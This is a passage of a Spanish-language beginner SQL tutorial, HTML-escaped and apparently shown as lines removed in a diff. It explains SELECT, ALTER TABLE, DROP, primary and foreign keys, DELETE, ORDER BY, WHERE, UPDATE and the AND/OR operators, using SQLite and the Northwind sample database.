-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En la parte de abajo se nos mostrara un mensaje comunicandonos que la consulta se ejecuto sin errores.&lt;/p&gt;
-
-&lt;h2 id=&quot;consultas-o-querys&quot;&gt;CONSULTAS O QUERYS &lt;a href=&quot;#consultas-o-querys&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Una consulta o query son las solicitudes o operaciones que realizamos a una base de datos. Basicamente las consultas se usan para realizar la operaciones basicas &lt;code&gt;CRUD&lt;/code&gt;, las cuales son el acronimo de:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/crud.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;instruccion-select&quot;&gt;INSTRUCCION SELECT &lt;a href=&quot;#instruccion-select&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;La consulta &lt;code&gt;SELECT&lt;/code&gt;, nos devuelve un conjunto de resultados de registros de una o varias tablas. Podemos seleccionar todos los campos haciendo uso de &lt;code&gt;*&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Tambien podemos seleccionar un campo o mas especificos separandolos por comas &lt;code&gt;,&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como resultado nos arroja una tabla nueva con los registros que filtramos.&lt;/p&gt;
-
-&lt;h2 id=&quot;modificar-tabla-alter-table&quot;&gt;MODIFICAR TABLA - ALTER TABLE &lt;a href=&quot;#modificar-tabla-alter-table&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Esta instrucción nos permite modificar la estructura existente de una tabla de nuestra base de datos, en otras palabras a que despues de haberla creado podemos hacer modificaciones en ella como cambiarle el nombre, agregar, renombrar o quitar columnas y cambiar el tipo de datos.&lt;/p&gt;
-
-&lt;h2 id=&quot;renombrar-tabla&quot;&gt;RENOMBRAR TABLA &lt;a href=&quot;#renombrar-tabla&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Si queremos renombrar el nombre de nuestra tabla, debemos usar la instrucción &lt;code&gt;ALTER TABLE&lt;/code&gt; mas el nombre de la tabla actual y seguidamente &lt;code&gt;RENAME TO&lt;/code&gt; mas el nombre al cual deseamos cambiar.&lt;/p&gt;
-
-&lt;p&gt;En este caso aplicaremos el proceso a nuestra tabla &lt;code&gt;Alumnos&lt;/code&gt; para renombrarla como &lt;code&gt;Estudiantes&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;y de esta manera vemos que se efectua correctamente y ahora si queremos seleccionar los datos de nuestra tabla, debemos hacerlos con el nuevo nombre que ahora corresponde a &lt;code&gt;Estudiantes&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;renombrar-columna&quot;&gt;RENOMBRAR COLUMNA &lt;a href=&quot;#renombrar-columna&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;De la misma manera que renombramos la tabla, tambien podemos hacer el proceso similar para renombrar una columna, para ello debemos ejecutar igualmente la sentencia &lt;code&gt;ALTER TABLE&lt;/code&gt; mas la tabla que contenga a la columna, despues &lt;code&gt;RENAME COLUMN&lt;/code&gt; mas el nombre actual de la columna y finalmente con &lt;code&gt;TO&lt;/code&gt; le especificamos el nombre al cual lo vamos a cambiar.&lt;/p&gt;
-
-&lt;p&gt;Vamos a verlo de manera practica aplicandolo a la columna &lt;code&gt;edad&lt;/code&gt; de nuestra tabla &lt;code&gt;Estudiantes&lt;/code&gt; y la renombraremos como &lt;code&gt;Edades&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora volvemos a seleccionar la consulta y vemos que renombramos la columna exitosamente.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;agregar-columna&quot;&gt;AGREGAR COLUMNA &lt;a href=&quot;#agregar-columna&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Ahora supongamos queremos agregar una nueva columna a nuestra tabla &lt;code&gt;Estudiantes&lt;/code&gt; que corresponda con el nombre de &lt;code&gt;Profesion&lt;/code&gt;, pues esto lo hariamos de manera similiar usando de nueva cuenta &lt;code&gt;ALTER TABLE&lt;/code&gt; mas el nombre de nuestra tabla, despues usaremos la palabra reservad &lt;code&gt;ADD&lt;/code&gt; y seguidamente el nombre que tendra nuestra columna en conjunto con su tipo de dato.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si visualizamos nuevamente nuestra tabla &lt;code&gt;Estudiantes&lt;/code&gt; observamos que ahora se añadio la columna &lt;code&gt;Profesion&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;eliminar-columna&quot;&gt;ELIMINAR COLUMNA &lt;a href=&quot;#eliminar-columna&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Para pode eliminar una columna, si supongamos esta no corresponde o cometimos un error al crearla es bastante similar a la creacion de una, solo que en este caso debemos nuevamente usar la sentencia &lt;code&gt;ALTER TABLE&lt;/code&gt; con el nombre de la tabla y despues &lt;code&gt;DROP COLUMN&lt;/code&gt; mas el nombre del campo a eliminar.&lt;/p&gt;
-
-&lt;p&gt;Vamos a aplicarlo para borrar el campo previamente creado que fue &lt;code&gt;Profesion&lt;/code&gt;, ejecutamos la consulta de manera exitosa.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si nuevamente vemos nuestra tabla &lt;code&gt;Estudiantes&lt;/code&gt;, ahora el campo &lt;code&gt;profesion&lt;/code&gt; fue eliminado.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql17.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;instruccion-drop&quot;&gt;INSTRUCCION DROP &lt;a href=&quot;#instruccion-drop&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Esta sentencia probablemente solo la utilizaremos cuando estemos en la fase de construcción de nuestra base de datos, ya que en esta etapa haciendo los cambios pertinentes hasta que este lista, de otro modo si la ejecutariamos en produccion los resultados serian desastrozos y posiblemente irreparables si no contamos con una copia de seguridad.&lt;/p&gt;
-
-&lt;h2 id=&quot;eliminar-base-de-datos-drop-database&quot;&gt;ELIMINAR BASE DE DATOS - DROP DATABASE &lt;a href=&quot;#eliminar-base-de-datos-drop-database&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Para eliminar una base de datos solo debemos de ejecutar &lt;code&gt;DROP DATABASE&lt;/code&gt; y seguidamente el nombre de la base de datos, sin embargo esta instrucción no se puede ejecutar en &lt;code&gt;sqlite3&lt;/code&gt; asi que tenemos que hacerlo manualmente, pero otros gestores si permiten esta opción asi es que es bueno saberlo.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql18.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;eliminar-tabla-drop-table&quot;&gt;ELIMINAR TABLA - DROP TABLE &lt;a href=&quot;#eliminar-tabla-drop-table&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Para poder eliminar una tabla debemos de ejecutar la instrucción &lt;code&gt;DROP TABLE&lt;/code&gt; y seguidamente el nombre de la tabla a eliminar.&lt;/p&gt;
-
-&lt;p&gt;Vamos a crearnos para el proceso una tabla de nombre prueba, que contenga los campos &lt;code&gt;nombre&lt;/code&gt; y &lt;code&gt;edad&lt;/code&gt; con datos cualquiera.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql19.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora en esa tabla ejecutaremos la instrucción y vemos que la tabla se elimina.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql20.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;pero aqui hay algo que quisiera agregar, cuando ejecutamos nuevamente el comando este nos devuelve un error en vista que ya no existe la tabla.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql21.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Para poder solucionar eso cuando se realize una creación de tabla o eliminación usar la palabra reservada &lt;code&gt;IF EXISTS&lt;/code&gt; y  de esa manera comprueba la existencia de la tabla antes de borrarla y en consecuencia evitamos los errores.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql22.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;identificadores&quot;&gt;IDENTIFICADORES &lt;a href=&quot;#identificadores&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Cuando estamos insertando registros, debemos de poder usar un metodo que nos permita diferenciar los registros de tal modo que cada uno de estos sea unico. Aqui es donde comenzamos a usar los &lt;code&gt;identificadores&lt;/code&gt; los cuales son de dos tipos: &lt;code&gt;claves primarias y claves foraneas&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;claves-primarias-o-primary-keys&quot;&gt;CLAVES PRIMARIAS - PRIMARY KEYS &lt;a href=&quot;#claves-primarias-o-primary-keys&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Cada tabla debe de tener su identificador unico, que no se puede repetir para poder diferencias los registros, esto se conoce como &lt;code&gt;clave primary&lt;/code&gt;, la cual no puede ser nula y es autoincrementable.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si queremos definir una clave primaria en nuestra tabla anteriormente creada, primero tendriamos que eliminar todos los registros, de otro modo no podremos hacerlo. Por ello siempre al momento de crear una tabla es necesario definir nuestra &lt;code&gt;clave primaria&lt;/code&gt; y evitar problemas.&lt;/p&gt;
-
-&lt;p&gt;En nuestro caso vamos a eliminar los registros para seguir trabajando con muestra tabla &lt;code&gt;Àlumnos&lt;/code&gt; y esto lo hacemos con otra consulta la cual es &lt;code&gt;DELETE&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;identificadores&quot;&gt;INSTRUCCION DELETE &lt;a href=&quot;#identificadores&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Para borrar los registros debemos usar la palabra reservada &lt;code&gt;DELETE FROM&lt;/code&gt; y a continuación el nombre de la tabla.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si queremos hacerlo de manera grafica, nos vamos a la opción &lt;code&gt;Database Structure&lt;/code&gt;, buscamos la tabla y le damos en modificar.&lt;/p&gt;
-
-&lt;p&gt;Se nos volvera a abrir nuevamente la misma pestaña de cuando creamos la tabla, pero ahora modificaremos los valores y añadiremos un campo &lt;code&gt;id_alumno&lt;/code&gt; y seleccionaremos las opciones de &lt;code&gt;PK&lt;/code&gt; clave primary - auto-incrementable.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Tambien podriamos hacerlo desde el apartado de &lt;code&gt;Execute Sql&lt;/code&gt; insertando la siguiente consulta que nos marca el propio gestor.&lt;/p&gt;
-
-&lt;p&gt;Una vez modificada la tabla, probamos a insertar nuevamente varios registros con &lt;code&gt;INSERT INTO&lt;/code&gt; que lo vimos previamente.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;No es necesario que especifiquemos el campo &lt;code&gt;id_alumno&lt;/code&gt;, puesto que es &lt;code&gt;auto-incrementable&lt;/code&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Debemos tener en cuenta que si ejecutamos varias consultas, entonces tenemos que separarlas con &lt;code&gt;;&lt;/code&gt;.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Ahora verificamos los registros insetados haciendo uso del &lt;code&gt;SELECT&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si vemos esta vez el &lt;code&gt;id_alumno&lt;/code&gt; nos muestra el numero de identificador distinto el cual hace que los registros que ahora tenemos sean unicos.&lt;/p&gt;
-
-&lt;h2 id=&quot;claves-foraneas-o-foreign-keys&quot;&gt;CLAVES FORANEAS - FOREIGN KEYS &lt;a href=&quot;#claves-foraneas-o-foreign-keys&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Para entender lo que es una clave foranea, primero vammos a crear una neuva tabla y la llamaremos &lt;code&gt;turno_clase&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Como ya vimos anteriormente cada tabla tiene su clave primaria, pero esta vez vemos que en la tabla &lt;code&gt;turno_clase&lt;/code&gt; existe un campo &lt;code&gt;id_alumno&lt;/code&gt; que no esta haciendo referencia a una clave primaria ya que esta se repite. Entonces te preguntaras a que hace referencia entonces ese campo?&lt;/p&gt;
-
-&lt;p&gt;Pues ese campo se llama &lt;code&gt;clave foranea&lt;/code&gt; ya que se utiliza para hacer referencia a una &lt;code&gt;clave primaria&lt;/code&gt; de otra tabla, en este caso a la clave de la tabla &lt;code&gt;alumnos&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Ya que la tabla &lt;code&gt;turno_clase&lt;/code&gt; necesita hacer referencia a los &lt;code&gt;alumnos&lt;/code&gt; mediante el valor unico que tienen correspondiente al &lt;code&gt;id_alumno&lt;/code&gt; y con ese identificador podemos tener acceso a toda la información de los alumnos.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En este punto para poder continuar aprendiendo todas los tipos de consultas que nos falta es necesario que tengamos una &lt;code&gt;Base de Datos&lt;/code&gt; de mayor escala y asi entender todo de manera mas clara, para ello vamos a descargarnos una de las tipicas bases de datos que se usan a la hora de aprender &lt;code&gt;Sql&lt;/code&gt;. En este caso vamos a utilizar la base de datos de &lt;code&gt;Northwind.db&lt;/code&gt; del siguiente enlace:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://en.wikiversity.org/wiki/Database_Examples/Northwind/SQLite&quot;&gt;https://en.wikiversity.org/wiki/Database_Examples/Northwind/SQLite&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Una vez vayamos a este enlace lo unico que tenemos que hacer es copiar toda la consulta entera y pegarla en el apartado de &lt;code&gt;Execute SQL&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si ahora nos dirigimos al apartado de &lt;code&gt;Database Structure&lt;/code&gt; podemos visualizar la DB &lt;code&gt;Northwind.db&lt;/code&gt;, y ahora estamos listos para continuar.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;clausula-as-o-alias&quot;&gt;CLAUSULA AS O ALIAS &lt;a href=&quot;#clausula-as-o-alias&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Anteriormente vimos que podiamos seleccionar registro de las tablas usando &lt;code&gt;SELECT&lt;/code&gt;, en este caso al ahora trabajar con &lt;code&gt;northwind&lt;/code&gt; podemos probar a seleccionar alguna de las tablas como &lt;code&gt;Customers&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Pero hay ocasiones como esta en las que nos resulte tedioso trabajar con tablas las cuales no creamos previamente nosotros y para poder entenderlas mejor queramos cambiar el nombre de los campos de estas por algo mas descriptivo para nostros, es posible esto?.&lt;/p&gt;
-
-&lt;p&gt;Pues la respuesta es si y eso lo hacemos con la palabra reservada &lt;code&gt;AS&lt;/code&gt; despues de seleccionar los campos deseados y especificamos el nombre al que queremos renombrar para que se muestren en los registros, no debemos olvidar que con &lt;code&gt;FROM&lt;/code&gt; especificamos de que tabla queremos hacer la consulta.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Podriamos usar el mismo concepto para en la tabla &lt;code&gt;Products&lt;/code&gt;, supongamos que en nuestra empresa un dia especifico se dan los productos a mitad de precio, nosotros podriamos mostrar el precio normal y tambien otro campo donde nos muestre el precio a la mitad. Ya que al &lt;code&gt;precio&lt;/code&gt; ser un valor numerico podemos hacer operaciones como multiplicarlo, dividirlo y entre otras operaciones matematicas comunes como a continuación.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;clausula-order-by&quot;&gt;CLAUSULA ORDER BY &lt;a href=&quot;#clausula-order-by&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Imaginemos una situación en la que tenemos una tabla, en este caso especifico la tabla &lt;code&gt;Products&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora en la empresa en la que trabajamos, nos piden ordenar la tabla pero no queremos que se ordene por defecto con el &lt;code&gt;product_id&lt;/code&gt;, mas bien queremos ordenarlo por el &lt;code&gt;precio&lt;/code&gt;.Pues en este caso utilizariamos &lt;code&gt;ORDER BY&lt;/code&gt; y seguidamente el campo por el cual queremos ordenarla.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;De este modo lo que haria la consulta seria ordenar la tabla en base a la columna de los &lt;code&gt;Precios&lt;/code&gt;, pero vemos que nos los ordenar de menor a mayor y nosotros queremos que se ordenen los precios de mayor a menor ya que nos importan los prodcutos que cuestan mas.&lt;/p&gt;
-
-&lt;p&gt;Pues en ese caso usuariamos &lt;code&gt;DESC&lt;/code&gt; al final para poder ordenarlo en modo &lt;code&gt;DESCENDENTE&lt;/code&gt; y de igual forma podriamos usar tambien &lt;code&gt;ASC&lt;/code&gt; que nos lo ordenaria de manera &lt;code&gt;ASCENDENTE&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Entonces te preguntaras genial, me ordenar segun el precio ya que es un valor numerico, pero que pasa si en vez de ese campo, lo ordeno por &lt;code&gt;ProductName&lt;/code&gt;?. En ese caso tambien nos lo va ordenar pero al ser tipo de dato &lt;code&gt;TEXT&lt;/code&gt; lo hara alfabeticamente.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;clausula-where&quot;&gt;CLAUSULA WHERE &lt;a href=&quot;#clausula-where&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;En &lt;code&gt;SQL&lt;/code&gt; la capacidad de usar condicionales es muy importante ya que estas nos permiten encontrar consultas muy especificas. De igual forma que en los demas lenguajes de programación, podemos ejecutar una sentencia en la medida en que la condición se cumpla.&lt;/p&gt;
-
-&lt;p&gt;Una de las formas de hacer esto en &lt;code&gt;sql&lt;/code&gt; es con el uso de la clausula &lt;code&gt;WHERE&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Si ahora seleccionamos algun campo de una tabla de nuestra base de datos como en este caso de &lt;code&gt;Products&lt;/code&gt;, la consulta nos devuelve todos los registros de los campos seleccioandos&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Pero supongamos nosotros solo queremos mostrar uno de ellos, concretamente lo correspondiente al producto &lt;code&gt;Tofu&lt;/code&gt;. Pues aqui utilizarimos la clausula &lt;code&gt;WHERE&lt;/code&gt; y seguida la condición en este caso queremos que el &lt;code&gt;ProductName&lt;/code&gt; sea igual a &lt;code&gt;Tofu&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query17.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Entonces la consulta nos devolveria los campos, donde solamente el &lt;code&gt;ProductName = Tofu&lt;/code&gt;, y de cumplirse la condicion al ser &lt;code&gt;TRUE&lt;/code&gt; nos los devuelve, de lo contrario si no existiera nos devolveria &lt;code&gt;FALSE&lt;/code&gt; y no se nos mostraria.&lt;/p&gt;
-
-&lt;p&gt;Ahora vamos a hacer algo un poquito mas complejo, supongamos que queremos obtener los productos solo si los precios son mayores a &lt;code&gt;50&lt;/code&gt;. En este caso usariamos los operadores de comparación en nuestra codición donde &lt;code&gt;Price &amp;gt; 50&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query18.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Tambien podriamos usar el &lt;code&gt;WHERE&lt;/code&gt;cuando queremos eliminar registros, en este caso vemos que en la tabla &lt;code&gt;Products&lt;/code&gt;, existe un producto donde el &lt;code&gt;Precio = 0&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query19.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Entonces para eliminarlo usriamos la siguiente consulta usando &lt;code&gt;DELETE&lt;/code&gt;  y con &lt;code&gt;WHERE&lt;/code&gt;, especificariamos la condición de modo tal que se elimine el registro solo si el precio es 0.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query20.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si ahora volvemos a ejecutar la consulta vemos que efectivamente el registro se elimino.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query21.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;instruccion-update&quot;&gt;INSTRUCCION UPDATE &lt;a href=&quot;#instruccion-update&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;La instrucción &lt;code&gt;UPDATE&lt;/code&gt; se utiliza para modificar los datos existentes de una o varias filas.&lt;/p&gt;
-
-&lt;p&gt;Usaremos nuestra tabla &lt;code&gt;Estudiantes&lt;/code&gt; para modificar la edad de nuestro registro donde el nombre es &lt;code&gt;Juan&lt;/code&gt; y asignarle el valor de &lt;code&gt;30&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Para actualizarlo debemos de ejecutar la instrucción &lt;code&gt;UPDATE&lt;/code&gt; mas el nombre de la tabla &lt;code&gt;Estudiantes&lt;/code&gt;, despues con &lt;code&gt;SET&lt;/code&gt; espeficamos la columna con el valor que deseamos cambiar &lt;code&gt;Edades = 30&lt;/code&gt; y finalmente la condición con &lt;code&gt;WHERE&lt;/code&gt; donde especificamos el resgistro especifico en nuestro caso donde el &lt;code&gt;Nombre = &quot;Juan&quot;&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql23.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Al ver nuevamente nuestra tabla &lt;code&gt;Estudiantes&lt;/code&gt;, ahora en el campo edad nuestro usuario tiene el valor de 30.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql24.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;operadores-en-sql&quot;&gt;OPERADORES EN SQL &lt;a href=&quot;#operadores-en-sql&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Los operadores son palabras clave en &lt;code&gt;SQL&lt;/code&gt; que utilizamos para realizar comparaciones, calculo y combinar condiciones en las consultas y espresiones &lt;code&gt;SQL&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;operadores-and-y-or&quot;&gt;OPERADORES AND Y OR &lt;a href=&quot;#operadores-and-y-or&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Vimos anteriormente que con &lt;code&gt;WHERE&lt;/code&gt; podemos aplicar condiciones, pero en muchas ocasiones vamos a querer ejecutar multiples condiciones, y para poder hacerlo tendremos que usar &lt;code&gt;AND o OR&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;operador-and&quot;&gt;OPERADOR AND &lt;a href=&quot;#operador-and&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Si ya tenemos conocimientos premios en cualquier lenguaje de programación, podemos sobreentender lo que hace &lt;code&gt;AND&lt;/code&gt;, que basicamente nos devuelve un resultado de cumplirse ambas condiciones.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora para el siguiente ejemplo vamos a seleccionar de la tabla &lt;code&gt;Customers&lt;/code&gt; solo aquellos donde el pais sea &lt;code&gt;Spain&lt;/code&gt; y la ciudad sea &lt;code&gt;Madrid&lt;/code&gt;, en caso se cumplan ambas condicones quiero que me devuelva los registros.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query22.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;operador-or&quot;&gt;OPERADOR OR &lt;a href=&quot;#operador-or&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Al contrario que el and, &lt;code&gt;OR&lt;/code&gt; nos devuelve un resultado al cumplirse alguna de las dos condiones, no valida que se cumplan ambas ya que con solo cumplirse una de ellas esta nos devolvera un registro.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Supongamos vamos a hacer una consulta donde, queremos seleccionar a los clientes que son del pais de &lt;code&gt;Argentina&lt;/code&gt; o que sean de la cuidad de &lt;code&gt;Barcelona&lt;/code&gt;.&lt;/p&gt;
-
